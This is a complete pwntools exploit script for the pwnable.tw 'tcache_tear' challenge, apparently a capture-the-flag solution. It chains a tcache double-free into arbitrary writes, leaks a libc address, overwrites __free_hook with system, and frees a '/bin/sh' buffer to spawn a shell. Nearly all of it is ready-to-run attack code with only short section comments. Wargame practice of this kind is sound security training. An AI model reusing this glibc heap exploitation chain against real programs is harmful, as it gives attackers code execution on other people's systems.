#!/usr/bin/env python3
#
# Exploit of tcache_tear from pwnable.tw
#

from pwn import *

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

def malloc(size,data):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(size)
    p.recvuntil("Data:")
    p.sendline(data)

def free():
    p.recvuntil("choice :")
    p.sendline("2")

def _info():
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Name :")
    return int(hex(unpack(p.recvline().strip(),"all"))[48:-48],16)

def setup():
    p.recvuntil("Name:")
    p.sendline(p64(0)+p64(0x601))

p = process([exe.path])
#gdb.attach(p,gdbscript=script)
setup()

# ARBITRARY WRITE 0x40
malloc(str(0x40),"B"*8)
free()
free()
malloc(str(0x40), p64(0x602060+0x420)) # [NAME_BUF] + 0x420 is the same size of the fake chunk
malloc(str(0x40), "")
malloc(str(0x40), p64(0)+p64(0x21)+p64(0)+p64(0)+p64(0)+p64(0x421))

# ARBITRARY WRITE 0x50
malloc(str(0x50),"B"*8)
free()
free()
malloc(str(0x50),p64(0x602060)) # [NAME_BUF]
malloc(str(0x50), "")
malloc(str(0x50), p64(0)+p64(0x421)+p64(0)+p64(0)+p64(0)+p64(0x602060+16))
free()

# LIBC LEAK
main_arena = _info()
print(hex(main_arena))
libc.address = (main_arena - 0x3ebca0)
info('LIBC ADDR: ' + hex(libc.address))

# FREE_HOOK OVERWRITE 0x60
malloc(str(0x60),"C"*8)
free()
free()
malloc(str(0x60),p64(libc.sym["__free_hook"]))
malloc(str(0x60),"")
malloc(str(0x60),p64(libc.sym["system"]))
malloc(str(0x20),"/bin/sh\x00")
free()

#gdb.attach(p)
p.interactive()
